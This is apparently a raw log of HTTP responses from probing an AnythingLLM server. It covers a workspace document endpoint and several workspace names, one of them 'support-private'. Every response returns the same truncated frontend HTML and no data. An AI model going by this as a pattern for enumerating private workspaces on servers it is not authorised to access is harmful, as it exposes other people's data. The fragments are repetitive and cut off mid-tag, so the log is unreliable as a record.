+<meta description="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:type" content="website" >
+<meta property="og:url" content="https://anythingllm.com" >
+<meta property="og:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:image" content="https://raw.githubusercontent.com/Mintplex-Labs/anything-llm/master/images/promo.png" >
+<meta property="twitter:card" content="summary_large_image" >
+<meta property="twitter:url" content="https://anythingllm.com" >
+<meta property="twitter:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:image" conte
+--- /api/workspace/fieldlink-operations/document/1c0fe454-6eec-448b-b2e4-1019457c495b
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 18:26:56 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1926
+Connection: keep-alive
+X-Powered-By: Express
+Vary: Origin
+ETag: W/"786-jHDM9QYiW/U5L0AOgYamV32ffdY"
+
+
+       <!DOCTYPE html>
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8" />
+            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+            <link type="image/svg+xml" href="/favicon.png" >
+<title >AnythingLLM | Your personal LLM trained on anything</title>
+<meta name="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta description="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:type" content="website" >
+<meta property="og:url" content="https://anythingllm.com" >
+<meta property="og:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:image" content="https://raw.githubusercontent.com/Mintplex-Labs/anything-llm/master/images/promo.png" >
+<meta property="twitter:card" content="summary_large_image" >
+<meta property="twitter:url" content="https://anythingllm.com" >
+<meta property="twitter:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:image" conte
+--- /api/workspace/fieldlink-operations/document/1c0fe454-6eec-448b-b2e4-1019457c495b?mode=raw
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 18:26:56 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1926
+Connection: keep-alive
+X-Powered-By: Express
+Vary: Origin
+ETag: W/"786-jHDM9QYiW/U5L0AOgYamV32ffdY"
+
+
+       <!DOCTYPE html>
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8" />
+            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+            <link type="image/svg+xml" href="/favicon.png" >
+<title >AnythingLLM | Your personal LLM trained on anything</title>
+<meta name="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta description="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:type" content="website" >
+<meta property="og:url" content="https://anythingllm.com" >
+<meta property="og:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:image" content="https://raw.githubusercontent.com/Mintplex-Labs/anything-llm/master/images/promo.png" >
+<meta property="twitter:card" content="summary_large_image" >
+<meta property="twitter:url" content="https://anythingllm.com" >
+<meta property="twitter:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="twitter:image" conte
+########## DOCLIST
+--- support-private
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 18:26:56 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1926
+Connection: keep-alive
+X-Powered-By: Express
+Vary: Origin
+ETag: W/"786-jHDM9QYiW/U5L0AOgYamV32ffdY"
+
+
+       <!DOCTYPE html>
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8" />
+            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+            <link type="image/svg+xml" href="/favicon.png" >
+<title >AnythingLLM | Your personal LLM trained on anything</title>
+<meta name="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta description="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:type" content="website" >
+<meta property="og:url" cont
+--- rillhaven-support
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 18:26:57 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1926
+Connection: keep-alive
+X-Powered-By: Express
+Vary: Origin
+ETag: W/"786-jHDM9QYiW/U5L0AOgYamV32ffdY"
+
+
+       <!DOCTYPE html>
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8" />
+            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+            <link type="image/svg+xml" href="/favicon.png" >
+<title >AnythingLLM | Your personal LLM trained on anything</title>
+<meta name="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta description="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:type" content="website" >
+<meta property="og:url" cont
+--- fieldlink-operations
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 18:26:57 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1926
+Connection: keep-alive
+X-Powered-By: Express
+Vary: Origin
+ETag: W/"786-jHDM9QYiW/U5L0AOgYamV32ffdY"
+
+
+       <!DOCTYPE html>
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8" />
+            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+            <link type="image/svg+xml" href="/favicon.png" >
+<title >AnythingLLM | Your personal LLM trained on anything</title>
+<meta name="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta description="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:type" content="website" >
+<meta property="og:url" cont
+DONE_MARK_19844
